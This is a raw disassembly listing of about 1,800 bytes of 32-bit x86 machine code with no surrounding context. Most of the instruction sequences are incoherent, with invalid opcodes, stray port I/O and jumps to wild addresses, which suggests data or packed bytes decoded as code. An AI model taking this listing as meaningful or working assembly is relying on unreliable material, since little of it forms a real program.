  41a05c:	adc    BYTE PTR [edi+0x18f2aa76],bh
  41a062:	sahf   
  41a063:	sahf   
  41a064:	adc    BYTE PTR [esi-0x77ee4e01],ah
  41a06a:	dec    ecx
  41a06b:	add    DWORD PTR [esi+0x32f070e7],edx
  41a071:	rol    BYTE PTR cs:[eax+ebx*2-0x5b],1
  41a076:	cmp    ebx,DWORD PTR [edi+ebp*1-0x8]
  41a07a:	(bad)  
  41a07b:	aas    
  41a07c:	mov    ah,0x9
  41a07e:	cmp    BYTE PTR [eax+ebp*8+0x60],ch
  41a082:	ror    al,1
  41a084:	add    al,0x20
  41a086:	mov    edi,0x721d0a1e
  41a08b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a08c:	inc    edi
  41a08d:	test   BYTE PTR [ecx+esi*4+0x5fbb7cf8],0x98
  41a095:	pop    edi
  41a096:	cmp    BYTE PTR gs:[eax],ah
  41a099:	push   edi
  41a09a:	into   
  41a09b:	and    eax,0x728441c
  41a0a0:	push   ds
  41a0a1:	imul   esi,DWORD PTR ds:0xcae568d1,0xffffff9c
  41a0a8:	ins    DWORD PTR es:[edi],dx
  41a0a9:	pop    ecx
  41a0aa:	add    al,0xec
  41a0ac:	push   0xffffff8b
  41a0ae:	mov    dh,0x19
  41a0b0:	fs inc eax
  41a0b2:	mov    bh,0xcb
  41a0b4:	dec    ebp
  41a0b5:	xchg   ecx,eax
  41a0b6:	pop    ebp
  41a0b7:	xchg   edi,eax
  41a0b8:	and    eax,0xc32ae2e6
  41a0bd:	ror    DWORD PTR [edx-0x32],1
  41a0c0:	cmp    BYTE PTR [edi],ah
  41a0c2:	pop    ebp
  41a0c3:	xchg   ebx,eax
  41a0c4:	dec    eax
  41a0c5:	and    esp,DWORD PTR [edi-0x2b760cc8]
  41a0cb:	mov    esp,gs
  41a0cd:	sub    al,0xce
  41a0cf:	push   ds
  41a0d0:	cwde   
  41a0d1:	int    0x15
  41a0d3:	stos   BYTE PTR es:[edi],al
  41a0d4:	frstor [edi]
  41a0d6:	cmp    cl,dl
  41a0d8:	xor    eax,0x67f83802
  41a0dd:	cwde   
  41a0de:	fcomp  DWORD PTR [esi]
  41a0e0:	hlt    
  41a0e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0e2:	dec    ecx
  41a0e3:	sub    bl,bh
  41a0e5:	pop    ebp
  41a0e6:	js     0x41a15d
  41a0e8:	in     al,0x4a
  41a0ea:	retf   
  41a0eb:	cmp    al,0xbb
  41a0ed:	jp     0x41a099
  41a0ef:	mov    eax,ds:0x19fbe99c
  41a0f4:	sub    al,0x7
  41a0f6:	ins    DWORD PTR es:[edi],dx
  41a0f7:	mov    edi,0x4ddd1e3c
  41a0fc:	shl    DWORD PTR [edi],0x41
  41a0ff:	adc    al,0x3b
  41a101:	ins    DWORD PTR es:[edi],dx
  41a102:	ja     0x41a0ec
  41a104:	mov    ds:0x88c80088,al
  41a109:	js     0x41a13a
  41a10b:	mov    ah,0x25
  41a10d:	popf   
  41a10e:	sub    esi,DWORD PTR [ecx+eax*1-0x1e]
  41a112:	inc    ebx
  41a113:	in     eax,dx
  41a114:	rcl    BYTE PTR [edx+0x6f],cl
  41a117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a118:	inc    ebx
  41a119:	imul   edi,DWORD PTR [ebp-0x3016fff4],0xffffff9e
  41a120:	gs mov al,0x65
  41a123:	ret    
  41a124:	or     al,ah
  41a126:	mov    DWORD PTR ds:0xbffcdec9,ebp
  41a12c:	or     BYTE PTR [esi+0x3829248d],dh
  41a132:	adc    ch,ah
  41a134:	ror    BYTE PTR [ebx],cl
  41a136:	stc    
  41a137:	aam    0xd3
  41a139:	jo     0x41a0ec
  41a13b:	nop
  41a13c:	add    al,dh
  41a13e:	repz call 0x7f5:0x71be62e2
  41a146:	or     bh,ch
  41a148:	pop    es
  41a149:	add    eax,edx
  41a14b:	das    
  41a14c:	arpl   WORD PTR [ebx],bx
  41a14e:	add    ch,BYTE PTR [eax-0xa]
  41a151:	pop    es
  41a152:	inc    ebp
  41a153:	jl     0x41a185
  41a155:	mov    ecx,0xd0cb550a
  41a15a:	inc    edx
  41a15b:	fnstsw WORD PTR [edx-0x564c3e54]
  41a161:	xor    eax,0xb33fd0d0
  41a166:	in     eax,dx
  41a167:	xchg   ebx,eax
  41a168:	jns    0x41a189
  41a16a:	ins    DWORD PTR es:[edi],dx
  41a16b:	(bad)  
  41a16c:	mov    bl,0xb4
  41a16e:	and    esi,DWORD PTR [eax-0x55]
  41a171:	mov    BYTE PTR [eax+0x39],al
  41a174:	enter  0x7daa,0x24
  41a178:	pop    ss
  41a179:	push   cs
  41a17a:	pop    edx
  41a17b:	add    ecx,esp
  41a17d:	int    0x30
  41a17f:	out    0xf2,eax
  41a181:	push   cs
  41a182:	jmp    0x3db21d7f
  41a187:	pop    edx
  41a188:	mov    ah,0x83
  41a18a:	cmp    edi,ecx
  41a18c:	loopne 0x41a1c4
  41a18e:	push   eax
  41a18f:	inc    ebx
  41a190:	int    0xd4
  41a192:	jmp    0x802e1be7
  41a197:	loop   0x41a1e4
  41a199:	xchg   ecx,eax
  41a19a:	out    0xda,al
  41a19c:	int3   
  41a19d:	jecxz  0x41a205
  41a19f:	xor    DWORD PTR [edi-0x56fcf76],esi
  41a1a5:	cmp    DWORD PTR [eax+ebp*4+0x5ce01d8a],0x5e523464
  41a1b0:	sbb    al,0x29
  41a1b2:	pusha  
  41a1b3:	sbb    BYTE PTR [esi+0x6f676938],al
  41a1b9:	les    eax,FWORD PTR [edx+0x1b]
  41a1bc:	xchg   esp,eax
  41a1bd:	push   0x5f
  41a1bf:	loope  0x41a18b
  41a1c1:	push   cs
  41a1c2:	outs   dx,DWORD PTR ds:[esi]
  41a1c3:	rol    DWORD PTR [edi+eax*4+0x4],0x26
  41a1c8:	iret   
  41a1c9:	in     al,0x19
  41a1cb:	test   al,0x5d
  41a1cd:	sbb    eax,esi
  41a1cf:	jecxz  0x41a202
  41a1d1:	ins    DWORD PTR es:[edi],dx
  41a1d2:	lds    esi,FWORD PTR [ebx]
  41a1d4:	xor    BYTE PTR [ecx+0x2c],cl
  41a1d7:	leave  
  41a1d8:	out    0x51,eax
  41a1da:	cmp    edx,ecx
  41a1dc:	mov    ecx,DWORD PTR [ebp-0xc]
  41a1df:	mov    DWORD PTR [ebp+0x8],ecx
  41a1e2:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1e5:	je     0x420e5d
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	mov    ebp,0x6ed119f4
  41a20c:	sbb    al,0x7d
  41a20e:	jp     0x41a21a
  41a210:	pop    edi
  41a211:	jp     0x41a28d
  41a213:	pop    esp
  41a214:	hlt    
  41a215:	test   BYTE PTR [esi],dh
  41a217:	leave  
  41a218:	sti    
  41a219:	jo     0x41a285
  41a21b:	(bad)  
  41a21d:	sbb    BYTE PTR [edx+0x25],al
  41a220:	sub    DWORD PTR [ecx+0x73467e68],edx
  41a226:	jle    0x41a23b
  41a228:	xchg   ecx,eax
  41a229:	icebp  
  41a22a:	scas   al,BYTE PTR es:[edi]
  41a22b:	add    al,BYTE PTR [edi*8+0x6ca64adf]
  41a232:	add    ah,0x53
  41a235:	(bad)  
  41a236:	loope  0x41a23f
  41a238:	sbb    DWORD PTR [esp+ebp*1],esi
  41a23b:	nop
  41a23c:	retf   0xb991
  41a23f:	(bad)  
  41a240:	test   BYTE PTR [edx-0x792cf35a],0x92
  41a247:	push   gs
  41a249:	das    
  41a24a:	mul    BYTE PTR [edi+0x4c177cb2]
  41a250:	loop   0x41a211
  41a252:	pushf  
  41a253:	or     dh,BYTE PTR [ebx-0x6c93b13]
  41a259:	jne    0x41a246
  41a25b:	cs dec esi
  41a25d:	lea    ebx,[edx+ebp*4-0x19737812]
  41a264:	cmp    bh,BYTE PTR [eax-0x43]
  41a267:	adc    BYTE PTR [edi],dh
  41a269:	mov    ebx,0x8ea3b40e
  41a26e:	jo     0x41a1f3
  41a270:	inc    esi
  41a271:	or     ecx,edx
  41a273:	xlat   BYTE PTR ds:[ebx]
  41a274:	scas   eax,DWORD PTR es:[edi]
  41a275:	call   0xba4eae15
  41a27a:	in     al,dx
  41a27b:	add    esp,eax
  41a27d:	test   al,0xfe
  41a27f:	dec    eax
  41a280:	sbb    al,0x67
  41a282:	mov    ds:0x593c06e0,eax
  41a287:	int3   
  41a288:	mov    cl,0xc5
  41a28a:	cmp    eax,0x5b9ae37d
  41a28f:	(bad)  
  41a290:	clc    
  41a291:	loop   0x41a28c
  41a293:	out    dx,eax
  41a294:	mov    bl,0xf9
  41a296:	ja     0x41a298
  41a298:	jl     0x41a238
  41a29a:	int    0xa6
  41a29c:	jb     0x41a2b6
  41a29e:	dec    ebx
  41a29f:	rol    DWORD PTR [ecx+ebx*2-0xa],cl
  41a2a3:	ret    
  41a2a4:	imul   eax,DWORD PTR [eax+0x41],0x76
  41a2a8:	pusha  
  41a2a9:	loopne 0x41a2a5
  41a2ab:	mov    ebp,0xebeca3f9
  41a2b0:	or     ebx,DWORD PTR [ebp-0x7a7e4d5e]
  41a2b6:	cld    
  41a2b7:	fild   QWORD PTR [esi]
  41a2b9:	stos   BYTE PTR es:[edi],al
  41a2ba:	xchg   BYTE PTR [ecx*4-0x5acadfd],dl
  41a2c1:	jle    0x41a2fe
  41a2c3:	sub    DWORD PTR [ecx+0x7bc5aa32],esi
  41a2c9:	clc    
  41a2ca:	inc    ebp
  41a2cb:	call   0xb15f:0xb93deafb
  41a2d2:	and    al,0xa
  41a2d4:	push   cs
  41a2d5:	xor    esp,DWORD PTR ss:[edi-0x645d273b]
  41a2dc:	loopne 0x41a2eb
  41a2de:	inc    edi
  41a2df:	out    0xaa,eax
  41a2e1:	mov    edi,0xfa56a1f3
  41a2e6:	pop    ds
  41a2e7:	or     eax,0x8c22557b
  41a2ec:	arpl   bp,si
  41a2ee:	xor    eax,DWORD PTR [eax-0x41]
  41a2f1:	gs int 0x5
  41a2f4:	mov    ebp,0x93befa01
  41a2f9:	(bad)  
  41a2fa:	jae    0x41a370
  41a2fc:	dec    edi
  41a2fd:	jle    0x41a2e7
  41a2ff:	lods   eax,DWORD PTR ds:[esi]
  41a300:	iret   
  41a301:	mov    al,0xd
  41a303:	push   eax
  41a304:	(bad)  
  41a305:	pop    ecx
  41a306:	dec    esi
  41a307:	adc    DWORD PTR [esi+ecx*1],eax
  41a30a:	xchg   edx,eax
  41a30b:	clc    
  41a30c:	mov    WORD PTR [ecx-0x6b77edee],fs
  41a312:	pop    ebx
  41a313:	clc    
  41a314:	xor    eax,0x60a52429
  41a319:	inc    edx
  41a31a:	inc    esp
  41a31b:	hlt    
  41a31c:	das    
  41a31d:	call   0xf0a39718
  41a322:	pusha  
  41a323:	pop    ebp
  41a324:	ror    DWORD PTR [edi+0x7faa1272],cl
  41a32a:	shl    BYTE PTR [ecx+ebx*8-0x5ec20732],0xf4
  41a332:	inc    edx
  41a333:	mov    ch,BYTE PTR [ebp+0x61]
  41a336:	push   0x81fbba32
  41a33b:	push   esi
  41a33c:	gs int3 
  41a33e:	xor    ebp,DWORD PTR [edi]
  41a340:	mov    edx,0xa4f162ca
  41a345:	jmp    0xa8f1d1b9
  41a34a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a34b:	shl    DWORD PTR [edx],0xc0
  41a34e:	daa    
  41a34f:	outs   dx,BYTE PTR ds:[esi]
  41a350:	mov    ebp,0xb228451
  41a355:	inc    ebx
  41a356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a357:	in     eax,0x73
  41a359:	mov    ch,dh
  41a35b:	jb     0x41a362
  41a35d:	test   DWORD PTR [ebx-0x40f39c26],0xf71b63a4
  41a367:	std    
  41a368:	or     al,0x7c
  41a36a:	xchg   ebx,eax
  41a36b:	sub    ebp,DWORD PTR [ecx-0x3d735af8]
  41a371:	outs   dx,BYTE PTR ds:[esi]
  41a372:	imul   edx,esi,0xfffffffd
  41a375:	jge    0x41a384
  41a377:	rcr    DWORD PTR [ecx-0x2],1
  41a37a:	pop    edi
  41a37b:	mov    dh,0x4a
  41a37d:	xchg   ebp,eax
  41a37e:	lea    esp,[ebp+0x28e84468]
  41a384:	cmp    ah,BYTE PTR [esi]
  41a386:	popa   
  41a387:	push   edx
  41a388:	pop    ds
  41a389:	shl    DWORD PTR [ecx-0x32],0x93
  41a38d:	dec    edx
  41a38e:	(bad)  
  41a38f:	cmp    eax,0x8a325d1f
  41a394:	loop   0x41a3d2
  41a396:	xor    eax,0xcf41ead9
  41a39b:	and    eax,ebp
  41a39d:	sbb    DWORD PTR [ecx+0x1a],esi
  41a3a0:	andps  xmm6,XMMWORD PTR ds:0x12e91b0
  41a3a7:	xchg   DWORD PTR [ecx+ebx*1],edx
  41a3aa:	inc    ebp
  41a3ab:	fstp   QWORD PTR [ebp+0x63]
  41a3ae:	push   esp
  41a3af:	cwde   
  41a3b0:	jnp    0x41a39b
  41a3b2:	or     edx,DWORD PTR [edi+0x3e]
  41a3b5:	and    ebp,ebx
  41a3b7:	pop    ss
  41a3b8:	retf   
  41a3b9:	fidiv  DWORD PTR [edi+0x659c6db1]
  41a3bf:	icebp  
  41a3c0:	inc    edi
  41a3c1:	xchg   ebp,eax
  41a3c2:	test   BYTE PTR [edi-0x4b],bl
  41a3c5:	adc    al,0x46
  41a3c7:	mov    ebx,0xd0279352
  41a3cc:	sub    eax,0x30fbca0c
  41a3d1:	ret    0x37d1
  41a3d4:	adc    DWORD PTR [edi-0x2a],esi
  41a3d7:	sub    edx,ecx
  41a3d9:	lfs    esp,FWORD PTR [edx-0x780c119f]
  41a3e0:	push   DWORD PTR [edi]
  41a3e2:	push   es
  41a3e3:	add    edi,eax
  41a3e5:	ins    DWORD PTR es:[edi],dx
  41a3e6:	ss cmc 
  41a3e8:	rcl    BYTE PTR [ebx+0x36dd8204],1
  41a3ee:	sbb    BYTE PTR [ebx-0x4d],dh
  41a3f1:	imul   edi,DWORD PTR [edi+0x7cad5e61],0xffffffb0
  41a3f8:	iret   
  41a3f9:	mov    ebx,esp
  41a3fb:	jns    0x41a433
  41a3fd:	in     al,dx
  41a3fe:	pop    ds
  41a3ff:	jnp    0x41a3cc
  41a401:	cmc    
  41a402:	dec    ebp
  41a403:	dec    ecx
  41a404:	scas   al,BYTE PTR es:[edi]
  41a405:	dec    edx
  41a406:	push   esi
  41a407:	cmp    eax,0xaee308ea
  41a40c:	mov    cl,0x10
  41a40e:	or     al,0xf4
  41a410:	popa   
  41a411:	repnz popa 
  41a413:	rcl    BYTE PTR [ebp+0x4206b9cd],0x51
  41a41a:	fmul   st(7),st
  41a41c:	cmp    al,0x32
  41a41e:	mov    bh,0xef
  41a420:	xor    DWORD PTR [edx-0x6b55e9dd],esi
  41a426:	test   al,0x51
  41a428:	ret    0x103e
  41a42b:	stos   BYTE PTR es:[edi],al
  41a42c:	scas   eax,DWORD PTR es:[edi]
  41a42d:	sahf   
  41a42e:	and    dh,BYTE PTR [ebx-0x470021f3]
  41a434:	jge    0x41a481
  41a436:	mov    cl,0xb
  41a439:	in     al,0xfa
  41a43b:	cmp    eax,0xc299df9c
  41a440:	sti    
  41a441:	push   ebp
  41a442:	mov    ds:0xfc6da26d,al
  41a447:	lods   al,BYTE PTR ds:[esi]
  41a448:	mov    ds:0x26ebda37,al
  41a44d:	xchg   al,bh
  41a44f:	push   eax
  41a450:	or     ebx,ecx
  41a452:	push   esi
  41a453:	and    eax,0x2f1a1548
  41a458:	repz jno 0x41a410
  41a45b:	scas   al,BYTE PTR es:[edi]
  41a45c:	adc    BYTE PTR es:[edi],cl
  41a45f:	push   ss
  41a460:	or     al,0xb1
  41a462:	add    edx,DWORD PTR [ebp-0x59e63a07]
  41a468:	ror    DWORD PTR [ecx-0x2f],0x8b
  41a46c:	icebp  
  41a46d:	inc    ebp
  41a46e:	int3   
  41a46f:	and    ecx,DWORD PTR ss:[ebp+0xb077535]
  41a476:	loopne 0x41a45b
  41a478:	ins    BYTE PTR es:[edi],dx
  41a479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a47a:	pop    esp
  41a47b:	or     al,0xb8
  41a47d:	out    0x9f,eax
  41a47f:	or     ecx,DWORD PTR [edi-0x4f]
  41a482:	cdq    
  41a483:	fldcw  WORD PTR [edi+0x23b2988f]
  41a489:	jmp    0xdd3270dd
  41a48e:	and    eax,0x306c3017
  41a493:	imul   DWORD PTR [edi-0x24]
  41a496:	lea    esi,[esi+0x2e]
  41a499:	mov    eax,ds:0x4ec4bb2
  41a49e:	cmc    
  41a49f:	sbb    eax,0xcc79ff9e
  41a4a4:	xchg   ebx,eax
  41a4a5:	outs   dx,DWORD PTR ds:[esi]
  41a4a6:	pop    eax
  41a4a7:	cmp    DWORD PTR [edi+0x14ba807a],edx
  41a4ad:	sbb    eax,0xf77cf25e
  41a4b2:	imul   ch
  41a4b4:	jae    0x41a50a
  41a4b6:	add    dl,BYTE PTR [eax]
  41a4b8:	test   DWORD PTR [edi+0x49],0x2a757a89
  41a4bf:	jno    0x41a45f
  41a4c1:	add    al,0x46
  41a4c3:	(bad)  
  41a4c4:	fcom   DWORD PTR [esi]
  41a4c6:	inc    edi
  41a4c7:	jp     0x41a462
  41a4c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4ca:	mov    esi,0xd4c8ba3a
  41a4cf:	xor    DWORD PTR [eax+edi*8+0x5b],esp
  41a4d3:	dec    BYTE PTR [eax-0x15e0e4e8]
  41a4d9:	test   eax,0x811fb267
  41a4de:	inc    ebx
  41a4df:	jle    0x41a4f2
  41a4e1:	and    eax,0xb799f48b
  41a4e6:	in     al,dx
  41a4e7:	mov    ebx,0xf317e698
  41a4ec:	adc    DWORD PTR [ebx-0x3effbe9],ecx
  41a4f2:	dec    eax
  41a4f3:	inc    edx
  41a4f4:	dec    edi
  41a4f5:	leave  
  41a4f6:	mov    edx,0xdf3cb64f
  41a4fb:	inc    ecx
  41a4fc:	daa    
  41a4fd:	(bad)  
  41a4ff:	add    eax,0x79fa92fa
  41a504:	adc    dl,BYTE PTR [edx-0x5d]
  41a507:	inc    edi
  41a508:	push   edi
  41a509:	xor    al,0xff
  41a50b:	xchg   ecx,eax
  41a50c:	and    ah,al
  41a50e:	pop    edi
  41a50f:	loope  0x41a590
  41a511:	mov    al,0xcb
  41a513:	sahf   
  41a514:	(bad)  
  41a515:	xchg   edi,eax
  41a516:	daa    
  41a517:	loope  0x41a4c8
  41a519:	test   DWORD PTR [ecx-0x13],0xcc19e106
  41a520:	pop    edi
  41a522:	das    
  41a523:	out    0x18,al
  41a525:	bound  edi,QWORD PTR [esi-0x53]
  41a528:	out    dx,al
  41a529:	jl     0x41a4f9
  41a52b:	inc    esi
  41a52c:	ss cld 
  41a52e:	and    eax,0x7decbcbd
  41a533:	mov    ebx,0x8476be24
  41a538:	dec    ecx
  41a539:	jno    0x41a4df
  41a53b:	mov    esp,0xb6b3c424
  41a540:	inc    edi
  41a541:	pop    ecx
  41a542:	bound  ebp,QWORD PTR ds:0x1d8b3600
  41a548:	fwait
  41a549:	xor    BYTE PTR [eax+ebx*1+0x24],dl
  41a54d:	cdq    
  41a54e:	xchg   esi,eax
  41a54f:	jne    0x41a54d
  41a551:	loop   0x41a56a
  41a553:	mov    ds:0x1540d5be,eax
  41a558:	xlat   BYTE PTR ds:[ebx]
  41a559:	push   edx
  41a55a:	mov    cl,0xd6
  41a55c:	adc    DWORD PTR [edx+eiz*8+0x79],0x619ffccc
  41a564:	push   ecx
  41a565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a566:	ret    0x96ee
  41a569:	jbe    0x41a568
  41a56b:	dec    esp
  41a56c:	test   DWORD PTR [ebx+edx*8],ebx
  41a56f:	mov    eax,0x3b882361
  41a574:	pop    ebx
  41a575:	mov    ecx,0x3bb1a0f7
  41a57a:	adc    eax,0x7a48a5f
  41a57f:	inc    edx
  41a580:	push   edi
  41a581:	or     DWORD PTR [ecx-0x358d510c],0x60
  41a588:	outs   dx,BYTE PTR ds:[esi]
  41a589:	in     al,0xef
  41a58b:	int3   
  41a58c:	mov    eax,ds:0xc4f40fea
  41a591:	push   edx
  41a592:	test   BYTE PTR [esp+ecx*2+0x7603e3ad],ah
  41a599:	mov    ebx,0xa547776d
  41a59e:	xchg   edx,edx
  41a5a0:	pminub mm3,mm5
  41a5a3:	mov    BYTE PTR [esi+0x4d],cl
  41a5a6:	push   ds
  41a5a7:	cmp    dl,BYTE PTR [edx-0x51]
  41a5aa:	leave  
  41a5ab:	pop    ecx
  41a5ac:	les    ebx,FWORD PTR [ebx]
  41a5ae:	push   es
  41a5af:	dec    ebx
  41a5b0:	cli    
  41a5b1:	pop    eax
  41a5b2:	jp     0x41a62e
  41a5b4:	ret    
  41a5b5:	call   DWORD PTR [eax+0x52]
  41a5b8:	mov    ch,0xc5
  41a5ba:	ja     0x41a54c
  41a5bc:	add    al,0x56
  41a5be:	int3   
  41a5bf:	hlt    
  41a5c0:	cli    
  41a5c1:	dec    edi
  41a5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5c3:	daa    
  41a5c4:	stc    
  41a5c5:	xor    al,0xd2
  41a5c7:	call   0x26c63d8b
  41a5cc:	and    BYTE PTR [ebx-0x14],ah
  41a5cf:	repnz sahf 
  41a5d1:	mov    BYTE PTR [eax-0x17ec42a6],bh
  41a5d7:	int3   
  41a5d8:	sub    eax,0xf73559f0
  41a5dd:	or     esi,DWORD PTR [ebp+ecx*8+0x14]
  41a5e1:	cld    
  41a5e2:	bound  ebx,QWORD PTR [ecx+eax*2]
  41a5e5:	dec    edx
  41a5e6:	add    eax,0x74641852
  41a5eb:	call   0x765c5c78
  41a5f0:	aad    0x3b
  41a5f2:	jnp    0x41a5a8
  41a5f4:	sbb    BYTE PTR [ebp-0x4345a6d6],ah
  41a5fa:	and    BYTE PTR [ebx+eax*4],0xf
  41a5fe:	mov    esi,0x878fbaa8
  41a603:	push   eax
  41a604:	mov    eax,ds:0x5e064f04
  41a609:	jecxz  0x41a59b
  41a60b:	sub    al,0xf6
  41a60d:	test   BYTE PTR [ebx],bl
  41a60f:	aam    0x3
  41a611:	lods   eax,DWORD PTR ds:[esi]
  41a612:	rol    DWORD PTR ds:0xb5baadce,cl
  41a618:	rcl    BYTE PTR [eax-0x54],1
  41a61b:	inc    esp
  41a61c:	sub    esp,DWORD PTR [ebp-0x44af8887]
  41a622:	std    
  41a623:	scas   al,BYTE PTR es:[edi]
  41a624:	cld    
  41a625:	mov    dh,0x52
  41a627:	popa   
  41a628:	mov    al,ds:0x2c076e94
  41a62d:	retf   0x67a7
  41a630:	gs pop ss
  41a632:	lea    ebp,[eax+0x57]
  41a635:	mov    esp,0xaf103dc
  41a63a:	imul   edx,DWORD PTR [edi+0x24],0x1
  41a63e:	mov    ah,0xfb
  41a640:	xchg   esp,eax
  41a641:	jo     0x41a600
  41a643:	and    BYTE PTR fs:[ebx+0xb],ch
  41a647:	xchg   edi,eax
  41a648:	lods   eax,DWORD PTR ds:[esi]
  41a649:	dec    eax
  41a64a:	mov    esi,0x875da777
  41a64f:	fmul   st,st(3)
  41a651:	push   esp
  41a652:	inc    esp
  41a653:	dec    ebp
  41a654:	inc    esp
  41a656:	mov    bh,0xd7
  41a658:	cld    
  41a659:	std    
  41a65a:	inc    edx
  41a65b:	add    BYTE PTR [ebp-0x5dbae5a1],al
  41a661:	xor    eax,edx
  41a663:	dec    edi
  41a664:	aam    0xd1
  41a666:	imul   edi,esi,0x5
  41a669:	xchg   ebx,eax
  41a66a:	enter  0xbe2e,0x7d
  41a66e:	ja     0x41a616
  41a670:	sahf   
  41a671:	cmp    edx,DWORD PTR [edi+0x2c]
  41a674:	mov    edx,0xacba90b2
  41a679:	nop
  41a67a:	inc    ecx
  41a67b:	sbb    BYTE PTR [edx],ah
  41a67d:	out    dx,eax
  41a67e:	nop
  41a67f:	add    ecx,DWORD PTR [ebp+0x40]
  41a682:	pop    ebx
  41a683:	retf   
  41a684:	(bad)  
  41a686:	adc    dl,cl
  41a688:	adc    ecx,DWORD PTR [eax]
  41a68a:	add    eax,0x8d841f3a
  41a68f:	(bad)  
  41a690:	pop    ebp
  41a691:	cmp    al,0xf9
  41a693:	fdiv   DWORD PTR [edi+0x426f3cdf]
  41a699:	sub    ah,BYTE PTR [eax-0x3942a9ff]
  41a69f:	jmp    0x41a71c
  41a6a1:	sahf   
  41a6a2:	pop    ss
  41a6a3:	jbe    0x41a68e
  41a6a5:	and    BYTE PTR ds:0x419960cf,bl
  41a6ab:	ins    DWORD PTR es:[edi],dx
  41a6ac:	mov    ds:0xfaec9526,al
  41a6b1:	std    
  41a6b2:	cwde   
  41a6b3:	inc    ebx
  41a6b4:	cwde   
  41a6b5:	cmp    eax,esp
  41a6b7:	fcomp  DWORD PTR [esi]
  41a6b9:	cmc    
  41a6ba:	inc    esi
  41a6bb:	push   eax
  41a6bc:	aas    
  41a6bd:	dec    ebx
  41a6be:	and    DWORD PTR [ebp+ebp*4-0x15],ebp
  41a6c2:	xchg   ebp,eax
  41a6c3:	dec    ecx
  41a6c4:	mov    ds:0xa206f4c7,al
  41a6c9:	or     DWORD PTR [ebp+0x5],esp
  41a6cc:	lods   eax,DWORD PTR ds:[esi]
  41a6cd:	mov    ah,0x97
  41a6cf:	sub    BYTE PTR [ebp-0x18],dh
  41a6d2:	(bad)  
  41a6d3:	sub    al,0x98
  41a6d5:	xchg   esi,eax
  41a6d6:	cmp    al,0x86
  41a6d8:	cwde   
  41a6d9:	adc    al,0x6
  41a6db:	test   DWORD PTR [ecx+esi*4],eax
  41a6de:	cmp    al,0x6f
  41a6e0:	retf   0x4656
  41a6e3:	sub    edi,DWORD PTR [ebp+0x31]
  41a6e6:	dec    eax
  41a6e7:	xchg   BYTE PTR [eax+eax*2],dl
  41a6ea:	push   ecx
  41a6eb:	add    BYTE PTR [esi+0x77],dl
  41a6ee:	push   ebp
  41a6ef:	xor    ebx,DWORD PTR [edx+0x4d67f8b3]
  41a6f5:	in     al,0x3
  41a6f7:	jnp    0x41a6e4
  41a6f9:	clc    
  41a6fa:	jo     0x41a70e
  41a6fc:	unpcklps xmm2,XMMWORD PTR [edi-0x57]
  41a700:	jle    0x41a690
  41a702:	mov    ah,BYTE PTR [edx-0x475d8960]
  41a708:	std    
  41a709:	ds dec eax
  41a70b:	add    eax,0x50bc1289
  41a710:	adc    eax,0xfb08fcd9
  41a715:	inc    eax
  41a716:	xor    al,BYTE PTR [esi+0x48]
  41a719:	jnp    0x41a70f
  41a71b:	inc    ebp
  41a71c:	gs into 
  41a71e:	in     eax,dx
  41a71f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a720:	xchg   ebx,eax
  41a721:	(bad)
  41a724:	fdivr  st,st(7)
  41a726:	or     edx,edx
  41a728:	add    eax,0x2944929e
  41a72d:	mov    dl,0xa9
  41a72f:	xlat   BYTE PTR ds:[ebx]
  41a730:	loop   0x41a758
  41a732:	aaa    
  41a733:	ss push edx
  41a735:	stos   DWORD PTR es:[edi],eax
  41a736:	sub    BYTE PTR [esi],cl
  41a738:	inc    ebx
  41a739:	loop   0x41a77f
  41a73b:	and    BYTE PTR [esi+0x2cd54cc7],bh
  41a741:	je     0x41a79f
  41a743:	xlat   BYTE PTR ds:[ebx]
  41a744:	xchg   esp,eax
  41a745:	push   ebx
  41a746:	ins    DWORD PTR es:[edi],dx
  41a747:	pop    ss
  41a748:	add    DWORD PTR [edx+0x66],esp
  41a74b:	sbb    al,0xe9
  41a74d:	adc    al,0x66
  41a74f:	in     al,0xa7
  41a751:	dec    esp
  41a752:	sub    esi,DWORD PTR [ebx]
  41a754:	aaa    
  41a755:	lods   al,BYTE PTR ds:[esi]
  41a756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a757:	push   ss
  41a758:	or     al,0x27
  41a75a:	sar    bl,1
  41a75c:	inc    ebx
  41a75d:	adc    ebx,DWORD PTR [ebp+0x50]
  41a760:	arpl   si,dx
  41a762:	std    
  41a763:	test   DWORD PTR [edx-0x3bb7e41e],esp
  41a769:	sbb    al,0xaf
  41a76b:	sbb    al,0xef
  41a76d:	ins    DWORD PTR es:[edi],dx
  41a76e:	daa    
  41a76f:	mov    al,ds:0x3465ac88
  41a774:	lds    ebp,FWORD PTR [ecx]
  41a776:	mov    al,0x35
  41a778:	pop    edx
  41a779:	nop
  41a77a:	dec    edi
  41a77b:	jmp    0x2540892f
  41a780:	fwait
  41a781:	pushf  
  41a782:	add    eax,0x5482b67e
  41a787:	mov    ds:0x1cf25973,eax
  41a78c:	jmp    0x41a7ef
  41a78e:	ja     0x41a7de
  41a790:	pop    ecx
  41a791:	es add al,0xfa
  41a794:	adc    eax,0xba30f07b
  41a799:	icebp  
  41a79a:	adc    al,0x15
  41a79c:	cld    
  41a79d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a79e:	mov    esp,0xe803947a
  41a7a3:	or     ecx,edi
  41a7a5:	or     dl,BYTE PTR [edx]
  41a7a7:	jb     0x41a770
  41a7a9:	scas   al,BYTE PTR es:[edi]
  41a7aa:	or     eax,0xbe5df199
  41a7af:	pop    ebx
